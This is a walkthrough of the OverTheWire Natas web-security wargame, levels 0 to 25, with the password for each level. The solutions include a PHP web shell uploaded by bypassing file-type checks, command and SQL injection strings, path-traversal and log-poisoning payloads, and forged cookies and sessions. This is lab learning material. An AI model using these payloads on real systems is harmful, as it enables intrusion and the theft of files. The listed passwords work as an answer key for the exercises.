Solutions:

Level 0:
	- Open Inspector and check the comments
	- Next Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

Level 1:
	- Again Inspect and check the comments
	- Next Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

Level 2:
	- From the hidden image, figure out that /files/ is accessible
	- from there go to users.txt
	- Next Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

Level 3:
	- append /robots.txt (most sites have a robots.txt to define rules for bots and crawlers)
	- now go to /s3cr3t/
	- from there go to users.txt
	- Next Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

Level 4:
	- go to network tab in developer console
	- after clicking on 'Refresh page' inspect the response
	- change the 'Referer' header to 'http://natas5.natas.labs.overthewire.org/" and send
	- Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK 

Level 5:
	- again go to network tab
	- this time modify the cookie to loggedin=1 and then send
	- Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

Level 6:
	- check the sourcecode
	- go to /includes/secret.inc and inspect it
	- copy the secret from comments and use that as the input
	- Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

Level 7:
	- add the search param 'index.php?page=/etc/natas_webpass/natas8' to url
	- Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

Level 8:
	- go to "https://encode-decode.com/" then decode bin2hex
	- now reverse the string and decode base64
	- Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

Level 9:
	- in the input bar type '; cat /etc/natas_webpass/natas10' (here we inject commands by exploiting php's passthru)
	- Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

Level 10:
	- in the input bar type '.* /etc/natas_webpass/natas11' (here we exploit the grep command)
	- Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

Level 11: (decode and encode done using https://gchq.github.io/CyberChef/)
	- Finding the XOR key:
		- URL decode the cookie followed by base64 decode
		- After which XOR encrypt using the json form of $defaultdata
		- key: eDWo
	- Generating the new cookie data:
		- make sure "showpassword" key is equal to "yes"
		- now apply json encoding and then XOR encrypt using the above key
		- now do base64 encode
		- new cookie data: HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
	- now replace the old cookie's data and reload
	- Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

Level 12: (implements client-side filtering bypass)
	- create a php file
	- type the following '<?php echo shell_exec($_GET['q'].' 2>&1'); ?>'
	- in the inspector change the input's value to a '.php' instead of '.jpg'
	- upload the php file
	- append /upload/{$randomFileName}.php in the URL
	- now in the URL type the query 'q=cat%20/etc/natas_webpass/natas13'
	- Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 

Level 13: (tricking the exif_imagetype() function)
	- same as previous level but the php file has the following 'GIF87a<?php echo shell_exec($_GET['q'].' 2>&1'); ?>'
	- this fools the function to thinking that the file is .gif (look up magic headers/signature)
	- the URL query is 'q=cat%20/etc/natas_webpass/natas14'
	- Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

Level 14: (SQL Injection)
	- in username type '1" OR 1=1 OR "' and keep password empty
	- Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

Level 15: (Blind SQL Injection)
	- run the 'natas15_blindsqlinject.py' script and after a while the password will be available
	- Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

Level 16: ({Blind?} Command Injection and getting indirectly info based on response)
	- run the 'natas16_commandinject.py' script and after a while the password will be available
	- Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

Level 17: (Time-based Blind SQL Injection)
	- run the 'natas17_time-blindsql.py' script and after a while the password will be available
	- Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

Level 18: (Session ID Fixation)
	- the max number of sessionIDs is 640, so we just brute-force it
	- run the 'natas18_sessionfixation.py' script and after a while the password will be available
	- Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

Level 19: (Session ID Fixation but Cookie is hex-encoded)
	- similar to the above but the PHPSESSID is hex-encoded version of '{sessionID}-admin'
	- run the 'natas19_sessionfixationencoded.py' script and after a while the password will be available
	- Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

Level 20:
	- here a user defined session_set_save_handler functions
	- the write handler stores the session info in a random file as '$key $value\n'
	- the read handler reads from that same file and updates the $_SESSION with all the keys it can find in that file
	- now the input value is stored in the $_SESSION["name"] variable
	- so if we give input in URL as '?name=admin%0Aadmin%201', it will stores in the file as 'name admin/nadmin 1' (in 2 lines)
	- now when the read handler saves to $_SESSION it will set the admin flag to 1 which displays the password
	- Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH 

Level 21:
	- inspect the site2's form's POST request and edit and resend the payload with '&admin=1'
	- this adds $_SESSION["admin"]=1
	- since the site are co-located, copy the Session ID of site2 to site1 and the key will be available
	- Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

Level 22:
	- use the command 'curl -H 'Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==' 'http://natas22.natas.labs.overthewire.org/?revelio' in terminal
	- this prevents the redirect and just gives the output of the ?revelio url
	- Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

Level 23:
	- the input should be '${some number>10}iloveyou' due to strstr() and the string>10 conditional 
	- Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

Level 24:
	- we cause a warning in strcmp() by making the input an array which makes it return NULL.
	- so the url param is 'passwd[]'
	- Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

Level 25:
	- the '../' check can be fooled with '....//'
	- now the url param is 'lang=....//logs/natas25_${Session ID}.log'
	- now we manipulate the value of log file (which records the request header's User-Agent param)
	- so we send the GET request again but change the User-Agent param to '<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'
	- now check the response of the request and the next password should be available
	- Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

